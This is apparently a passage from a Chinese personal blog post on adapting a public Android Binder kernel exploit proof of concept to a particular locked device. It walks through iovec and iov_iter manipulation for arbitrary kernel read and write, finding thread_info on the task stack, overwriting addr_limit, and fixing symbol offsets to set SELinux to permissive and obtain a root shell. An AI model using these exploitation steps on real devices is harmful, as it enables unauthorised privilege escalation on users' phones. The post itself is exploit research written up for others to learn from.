bio.iovs[9].iov_base  = dummy_page;
bio.iovs[9].iov_len   = 0x10001;            // 令人魂牵梦萦的 spinlock
bio.iovs[10].iov_base = (void *)0xdeadbeef; // 被漏洞覆盖
bio.iovs[10].iov_len  = 2 * 0x10 + 1;       // 少了个 0x8 因为不用写 len 了，多了个 1 因为要触发重新计算长度要多 write 一次
bio.iovs[11].iov_base = (void *)0xbeefdead; // 被我自己的 write 动作覆盖
bio.iovs[11].iov_len  = 8;                  // 没人动，一直是 8，实际上是要写入的有效数据的长度
// 注意所有 iov_len 都不能出错，否则会出现跟前面读取时一样的问题：因 iov_iter 的长度有差错，无法完整写入或多写

u64 second_write_chunk[] = {
    dummy_page,                             // 注意“写自己”之前之后两次 write 都要操作这个 iovec，所以“写自己”时写进去的这个地址必须合法，不然第二次 write 会崩
    2 * 0x10 + 1,                           // 覆盖成正常的
    current + 0x8,                          // 同上
    8                                       // 可写可不写，为了视觉美观还是写
    // 注意这里没有 0xfffffffffffffffe 了！因为中间要单独写 1 字节来重新计算长度以进入最后一个 iovec，所以这里不能一起写入，不然会写到 &bio.iovs[12].iov_base 上，没卵用
};
```

按以下步骤执行：

1. 写 0x10001 字节垃圾数据

   写完后 iov_iter 为：

   ```c
   struct iov_iter {
   	size_t iov_offset;       // 0
   	size_t count;            // (0x10001 + 2 * 0x10 + 1 + 8) - (0x10001) = 0x29
       const struct iovec *iov; // &bio.iovs[10]
   };
   ```

2. 触发漏洞

   ```c
   bio.iovs[9].iov_base  = dummy_page;
   bio.iovs[9].iov_len   = 0x20002;                   // 他（spinlock）改变了 iov_len
   bio.iovs[10].iov_base = &binder_thread->wait.head; // 原地 TP，指向 &bio.iovs[9].iov_len
   bio.iovs[10].iov_len  = &binder_thread->wait.head;
   bio.iovs[11].iov_base = (void *)0xbeefdead;
   bio.iovs[11].iov_len  = 8;
   ```

   没有读写动作，iov_iter 没变。

3. 写入 `second_write_chunk`. 这次它只有 0x20 字节，且比那个大的可怕的 iov_len 短得多，不会进入下个 iovec. 写完以后情况为：

   ```c
   bio.iovs[9].iov_base  = dummy_page;    // 没被写，反正跳过了无所谓
   bio.iovs[9].iov_len   = 0x20002;       // 没被写，反正跳过了无所谓
   bio.iovs[10].iov_base = dummy_page;    // 被写了，等会写一字节的时候会变成写到这里
   bio.iovs[10].iov_len  = 2 * 0x10 + 1;  // 被写了，写回了正常值，下次再 write 就能进下个 iovec 了
   bio.iovs[11].iov_base = current + 0x8; // 被写了，这是我们真正需要写入的地址
   bio.iovs[11].iov_len  = 8;             // 被写了，写进了一样的内容，就当作没变过吧

   // second_write_chunk 是 0x20 大，在写完后 iov_iter 变为
   struct iov_iter {
   	size_t iov_offset;       // 0x20
   	size_t count;            // (0x10001 + 2 * 0x10 + 1 + 8) - (0x10001 + 0x20) = 9
       const struct iovec *iov; // &bio.iovs[10]
   };
   ```

   > 这篇文档写到这里，似乎发现了一个新方法：在 second_write_chunk 里面覆盖 `bio.iovs[10].iov_base` 的时候，直接写进 `目标地址(current + 8) - 0x10`，iov_len 写成 `0x10 + 目标长度(8)`，删掉第二个 iovec. 这样一来，写完 0x10 大的 second_write_chunk 以后直接开一次新的 write 写目标数据是不是就好了？可以省一次 write 调用。

4. 写入一个字节。重新进入 `copy_to_iter()`，用刚写好的正确长度计算复制长度，会进入下个 iovec.

   ```c
   bio.iovs[9].iov_base  = dummy_page;
   bio.iovs[9].iov_len   = 0x20002;
   bio.iovs[10].iov_base = dummy_page;
   bio.iovs[10].iov_len  = 2 * 0x10 + 1;
   bio.iovs[11].iov_base = current + 0x8;
   bio.iovs[11].iov_len  = 8;

   // 写完这个字节以后
   struct iov_iter {
   	size_t iov_offset;       // 0
   	size_t count;            // (0x10001 + 2 * 0x10 + 1 + 8) - (0x10001 + 0x20 + 1) = 8
       const struct iovec *iov; // &bio.iovs[11] 推进了！
   };
   ```

5. 写入目的数据 `0xfffffffffffffffe`. 这次写到 `bio.iovs[11]`，就是 `current + 0x8` 了。

> 太难了
>
> 我这里说的一路通畅，鬼知道我为了调通上面这个方法花了多久（虽然是因为心情太爆炸犯了很多傻逼错误，浪费太多时间，然后越急越爆炸）

### 4. addr_limit 写了不生效？

写入部分根据 PoC 改的逻辑就是上面那样了，结果就是执行了跟没执行一样，`read()` 和 `write()` 时用内核地址仍然报 Bad address.

> 太难了

根据 Round 4 里面能用的那个 PoC 的日志，发现它认定我的内核上 `struct thread_info` 不在 `struct task_struct` 里面，而是去 task 的栈上搜索了。回到手上这个 PoC，它直接写了 `current + 8`，这是 thread_info 集成在 task_struct 里时才能这样写的。我的内核里 `current + 8` 是 task_struct->flags，乱写没崩算不错了。

也就是说，如果我要把手上这个 PoC 改好，我就也得按照 Round 4 PoC 的方法做一套从 stack 上搜索的机制。好在搜索关键字只有 0x8000000000000000，一次读出几十 KB 再搜索还比较简单。

> 实际上，为了实现这个搜索，我得把上面两个“从固定地址固定泄露一页内存”和“给任意地址写入 8 字节”的方法扩展成“从任意地址泄露任意多内存”、“给任意地址写入任意多字节”的。
>
> 为了实现前者，得把两个函数结合起来。在泄露内存内容时，刚一读到自己的地址（就是后一个 iovec 读出来的前 8 个字节）就要用 8 字节写入法来把它的内容改掉，我借别人写我自己，变成读取指定位置。还要记得考虑此时 iov_offset 已经不为 0 了，写上去的地址和长度要减 / 加现在的 offset，最开始的 iov_len 也要相应考虑好保证覆盖之后能从新的地址继续读。
>
> > 这看起来就是上面第三步说的省一次 write 的优化方法的思路。
>
> 调这两个任意读写的函数的过程我都忘了遇到啥问题了，反正现在来形容也就是“刺激”了。同样是傻逼错误和心态爆炸堆积起来的历程。

### 5. 结束

改了无数遍代码，写了无数次 current->comm 做测试，终于把上面两个任意读写函数调能用了。它们就只是因为占位占不到而偶尔不能用，其他逻辑都是完善的了。我没法在这一点上优化了。

> 我寻思整个 PoC 是不是都可以改成用这两个函数实现？这样就不用改 addr_limit 了，不用去做搜索了。
>
> 但是就算不做搜索，其他操作也要任意读取。不如还是改 addr_limit，就不用撞概率了，避免成功率以指数级衰落，速度也快得多。

> 对了，在写 current->comm 做测试的时候，还经常弄混当前在哪个进程 pid 上。可能实际上已经写成功了，但是在子进程 `system("cat ...")` 打印 `/proc/$(getpid())/status` 看的，看起来就没成功。
>
> > 我打印过  `/proc/self/status` ，结果打出来的 comm 是 cat. 十分合理，但是我觉得自己很傻逼。
>
> > 我甚至有一段时间把 `fork()` 记成了新建线程而不是进程，丢人。

把 `current->stack` 一次读出几百 KB 来，找到了 `struct thread_info` 就在 `current->stack` 指向内存的 0 偏移上，看起来很合理，但总觉得有人在玩我。覆盖了里面的 addr_limit 以后，`read()` 和 `write()` 传内核地址做参数的时候终于能过了。

接下来就是按第二篇文档的方法修正 `init_user_ns`、`selinux_enforcing` 等几个 symbol 的偏移，然后 PoC 就能跑了。虽然要下载编译一些新工具，但这是整个过程里最轻松的了。

> 第二篇文档里说的方法一点都不能差。我以为自己拿开源代码编译个内核，不求能用，只求偏移对上还够用，结果并不行，还差得十万八千字节远。
>
> 甚至连 task_struct 的内部结构都不一样了，current->comm 的实际位置离自编译内核都差了 8 字节。不知道哪里坑了。唉。

> 还有个小问题，PoC 一开始跑的时候报 current->cred 内容不符合预期，应该是 task_struct 里面 cred 的偏移给错了。要不是写 current->comm 做写入测试发现过那个 8 字节偏移，估计又得折腾好长时间。

最后，成功把 SELinux 改成 permissive 了，也弹了 root shell，mount 啥的指令也都能用了，但是我的最终目标“在系统分区里添加一个 apk”还是不行：这个设备不能解锁 bootloader，肯定不能刷 Magisk 在开机时 bind mount. 而它的 init.zygote.rc 里面又多写了几条语句，使得在 zygote 重启的时候执行 `setprop sys.powerctl reboot`，这样就没办法重新载入 Android 的 Java 部分了，没办法触发 PackageManagerService 重新扫描 package，我 mount 进去的 apk 没法被发现……

那么，我做这一切都是为了什么呢 [doge]